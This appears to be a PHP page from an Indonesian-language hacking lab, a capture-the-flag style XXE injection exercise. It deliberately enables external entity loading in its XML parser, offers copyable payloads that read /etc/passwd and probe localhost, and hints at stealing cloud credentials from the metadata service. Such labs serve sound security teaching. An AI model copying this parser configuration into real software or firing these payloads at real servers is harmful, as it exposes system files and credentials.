<?php
$active  = 'xxe';
$output  = '';
$raw_in  = '';
$result  = '';
$msg     = '';
$mtype   = '';
$parsed_xml = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $raw_in = $_POST['xml_payload'] ?? '';

    if (trim($raw_in) !== '') {
        // Vulnerable: external entity loading diaktifkan
        libxml_disable_entity_loader(false); // sengaja vulnerable
        libxml_use_internal_errors(true);

        $opts = LIBXML_NOENT | LIBXML_DTDLOAD | LIBXML_DTDATTR;
        $xml  = @simplexml_load_string($raw_in, 'SimpleXMLElement', $opts);

        if ($xml === false) {
            $errs  = libxml_get_errors();
            $emsg  = trim($errs[0]->message ?? 'XML parse error');
            $msg   = "XML Error: " . htmlspecialchars($emsg, ENT_QUOTES, 'UTF-8');
            $mtype = 'err';
            libxml_clear_errors();
        } else {
            $result = $xml->asXML();
            // Ambil teks dari semua node
            $texts = [];
            foreach ($xml->children() as $child) {
                $texts[] = (string)$child;
            }
            if (!empty($texts)) {
                $output = implode("\n", $texts);
                $msg    = "XML berhasil diparsing &mdash; entity telah di-resolve.";
                $mtype  = 'ok';
            } else {
                $msg    = "XML valid namun tidak ada konten yang dapat diekstrak.";
                $mtype  = 'warn';
            }
        }
    }
}

// Contoh payload siap pakai (tidak dieksekusi — hanya referensi)
$example_basic = '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<data>
  <item>&xxe;</item>
</data>';

$example_passwd = '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>
  <content>&xxe;</content>
</data>';

$example_ssrf = '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
  <!ENTITY ssrf SYSTEM "http://127.0.0.1:80/">
]>
<data>
  <probe>&ssrf;</probe>
</data>';
?>
<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>XXE Injection — ID-Networkers Lab</title>
<?php include '../includes/shared_css.php'; ?>
<style>
.payload-card{background:var(--el);border:1px solid var(--bd);border-radius:var(--r);padding:0;overflow:hidden;margin-bottom:10px;cursor:pointer;transition:border-color .15s}
.payload-card:hover{border-color:var(--bd2)}
.payload-head{display:flex;align-items:center;justify-content:space-between;padding:12px 16px;border-bottom:1px solid var(--bd)}
.payload-name{font-size:.8rem;font-weight:600;color:var(--t1)}
.payload-tag{font-size:.6rem;font-weight:700;letter-spacing:.1em;font-family:var(--mono)}
.payload-code{padding:12px 16px;font-family:var(--mono);font-size:.76rem;line-height:1.7;color:var(--t2);white-space:pre;overflow-x:auto}
.copy-btn{font-size:.68rem;font-weight:600;color:var(--t3);background:var(--bg);border:1px solid var(--bd);border-radius:4px;padding:3px 10px;cursor:pointer;transition:all .15s;font-family:inherit}
.copy-btn:hover{color:var(--t1);border-color:var(--bd2)}
</style>
</head>
<body>
<?php include '../includes/nav.php'; ?>

<div class="phdr">
  <div class="phdr-in">
    <div class="bc">
      <a href="/">Dashboard</a><span class="bc-sep">/</span><span>XXE Injection</span>
    </div>
    <h1>XXE Injection <span class="tag r">HARD</span></h1>
    <p class="phdr-desc">Endpoint ini memproses XML yang dikirim pengguna dengan external entity loading aktif. Gunakan deklarasi DOCTYPE untuk membaca file sistem dan melakukan probe jaringan internal.</p>
  </div>
</div>

<div class="wrap">

  <div class="box">
    <div class="box-t">Objectives</div>
    <ul class="obj-list">
      <li><div class="obj-n">1</div><span>Baca isi file <code class="ic">/etc/hostname</code> menggunakan basic XXE entity</span></li>
      <li><div class="obj-n">2</div><span>Baca isi file <code class="ic">/etc/passwd</code> untuk mengidentifikasi akun sistem</span></li>
      <li><div class="obj-n">3</div><span>Lakukan SSRF probe ke <code class="ic">http://127.0.0.1</code> via XXE</span></li>
      <li><div class="obj-n">4</div><span>Temukan file flag yang tersimpan di <code class="ic">/var/www/html/flag.txt</code></span></li>
    </ul>
  </div>

  <div class="box">
    <div class="box-t">Apa itu XXE?</div>
    <p class="prose">
      <strong>XML External Entity (XXE)</strong> adalah kerentanan yang terjadi ketika XML parser dikonfigurasi untuk
      memproses deklarasi entity eksternal dalam DOCTYPE. Attacker dapat mendeklarasikan entity yang merujuk ke
      <span class="hl-r">file sistem lokal</span> (<code class="ic">file://</code>),
      <span class="hl-o">layanan internal</span> (<code class="ic">http://</code>),
      atau sumber daya lainnya. Ketika entity tersebut dipanggil dalam dokumen, parser akan me-resolve nilainya
      &mdash; secara efektif membocorkan konten yang seharusnya tidak dapat diakses.
    </p>
  </div>

  <!-- XML Input -->
  <div class="box">
    <div class="box-t">XML Parser Endpoint &mdash; Vulnerable</div>
    <form method="POST" action="/xxe/">
      <div class="fg">
        <label class="fl">XML Payload</label>
        <textarea class="fi" name="xml_payload" rows="10"
          placeholder="Masukkan payload XML dengan DOCTYPE external entity..."
          style="min-height:180px"><?= htmlspecialchars($raw_in, ENT_QUOTES, 'UTF-8') ?></textarea>
      </div>
      <div style="display:flex;gap:10px">
        <button type="submit" class="btn btn-r">Parse XML</button>
        <?php if($raw_in): ?>
        <a href="/xxe/" class="btn btn-g">Reset</a>
        <?php endif; ?>
      </div>
    </form>
  </div>

  <?php if ($msg): ?>
  <div class="alert a-<?= $mtype ?>"><?= $msg ?></div>
  <?php endif; ?>

  <?php if ($output): ?>
  <div class="box">
    <div class="box-t">Entity Resolution Output</div>
    <div class="qbox" style="margin-bottom:0;white-space:pre-wrap;max-height:400px;overflow-y:auto"><div class="ql">Resolved Content</div><?= htmlspecialchars($output, ENT_QUOTES, 'UTF-8') ?></div>
  </div>
  <?php endif; ?>

  <!-- Payload Reference -->
  <div class="box">
    <div class="box-t">Payload Reference</div>
    <p class="prose" style="margin-bottom:16px">Klik pada payload di bawah untuk menyalinnya, lalu paste ke form di atas.</p>

    <div class="payload-card" onclick="copyPayload(this)">
      <div class="payload-head">
        <span class="payload-name">Basic XXE &mdash; Baca /etc/hostname</span>
        <div style="display:flex;align-items:center;gap:8px">
          <span class="payload-tag tag g">EASY</span>
          <button class="copy-btn" type="button">Salin</button>
        </div>
      </div>
      <div class="payload-code"><?= htmlspecialchars($example_basic, ENT_QUOTES, 'UTF-8') ?></div>
    </div>

    <div class="payload-card" onclick="copyPayload(this)">
      <div class="payload-head">
        <span class="payload-name">File Disclosure &mdash; Baca /etc/passwd</span>
        <div style="display:flex;align-items:center;gap:8px">
          <span class="payload-tag tag o">MEDIUM</span>
          <button class="copy-btn" type="button">Salin</button>
        </div>
      </div>
      <div class="payload-code"><?= htmlspecialchars($example_passwd, ENT_QUOTES, 'UTF-8') ?></div>
    </div>

    <div class="payload-card" onclick="copyPayload(this)">
      <div class="payload-head">
        <span class="payload-name">SSRF Probe &mdash; HTTP Request Internal</span>
        <div style="display:flex;align-items:center;gap:8px">
          <span class="payload-tag tag r">HARD</span>
          <button class="copy-btn" type="button">Salin</button>
        </div>
      </div>
      <div class="payload-code"><?= htmlspecialchars($example_ssrf, ENT_QUOTES, 'UTF-8') ?></div>
    </div>
  </div>

  <!-- Anatomy -->
  <div class="box">
    <div class="box-t">Anatomy of an XXE Payload</div>
    <div class="qbox"><div class="ql">Breakdown</div><span class="kw">&lt;?xml version="1.0"?&gt;</span>                 <span class="cm">&lt;-- XML declaration</span>
<span class="kw">&lt;!DOCTYPE</span> <span class="attr">root</span> [                      <span class="cm">&lt;-- Mulai DTD internal</span>
  <span class="kw">&lt;!ENTITY</span> <span class="attr">xxe</span>                      <span class="cm">&lt;-- Nama entity bebas</span>
    <span class="kw">SYSTEM</span> <span class="str">"file:///etc/passwd"</span>    <span class="cm">&lt;-- Path file yang ingin dibaca</span>
  <span class="kw">&gt;</span>
]<span class="kw">&gt;</span>
<span class="tag-xml">&lt;root&gt;</span>
  <span class="tag-xml">&lt;data&gt;</span><span class="kw">&amp;xxe;</span><span class="tag-xml">&lt;/data&gt;</span>             <span class="cm">&lt;-- Entity di-call di sini</span>
<span class="tag-xml">&lt;/root&gt;</span></div>
  </div>

  <!-- Hints -->
  <div class="box">
    <div class="box-t">Hints</div>

    <details class="hint">
      <summary>Hint 1 &mdash; Mulai dari yang sederhana</summary>
      <div class="hint-body">
        Gunakan payload <code class="ic">Basic XXE</code> di atas untuk membaca <code class="ic">/etc/hostname</code>.
        Jika berhasil, nama container akan muncul di output.
      </div>
    </details>

    <details class="hint">
      <summary>Hint 2 &mdash; File yang menarik untuk dibaca</summary>
      <div class="hint-body">
        <code class="ic">/etc/passwd</code> &mdash; daftar user sistem<br>
        <code class="ic">/etc/hosts</code> &mdash; mapping hostname ke IP<br>
        <code class="ic">/proc/version</code> &mdash; versi kernel<br>
        <code class="ic">/var/www/html/flag.txt</code> &mdash; file flag challenge
      </div>
    </details>

    <details class="hint">
      <summary>Hint 3 &mdash; SSRF via XXE</summary>
      <div class="hint-body">
        Ganti <code class="ic">file://</code> dengan <code class="ic">http://</code> untuk melakukan HTTP request:<br>
        <code class="ic">SYSTEM "http://127.0.0.1:8080/"</code><br>
        Ini membuktikan bahwa server dapat digunakan untuk menjangkau layanan internal.
      </div>
    </details>

    <details class="hint">
      <summary>Hint 4 &mdash; Kenapa XXE bisa berbahaya?</summary>
      <div class="hint-body">
        XXE memungkinkan attacker membaca file konfigurasi sensitif seperti <code class="ic">/etc/shadow</code>,
        SSH private key, database credentials, hingga source code aplikasi. Dalam konteks cloud,
        XXE dapat digunakan untuk mengakses <strong>Instance Metadata Service (IMDS)</strong>
        di <code class="ic">http://169.254.169.254/</code> untuk mencuri cloud credentials.
      </div>
    </details>
  </div>

</div>

<script>
function copyPayload(card) {
    const code = card.querySelector('.payload-code').textContent;
    navigator.clipboard.writeText(code).then(() => {
        const btn = card.querySelector('.copy-btn');
        const orig = btn.textContent;
        btn.textContent = 'Tersalin';
        btn.style.color = 'var(--green)';
        btn.style.borderColor = 'var(--gbdr)';
        setTimeout(() => {
            btn.textContent = orig;
            btn.style.color = '';
            btn.style.borderColor = '';
        }, 1800);
    });
}
</script>

<?php include '../includes/footer.php'; ?>
</body>
</html>
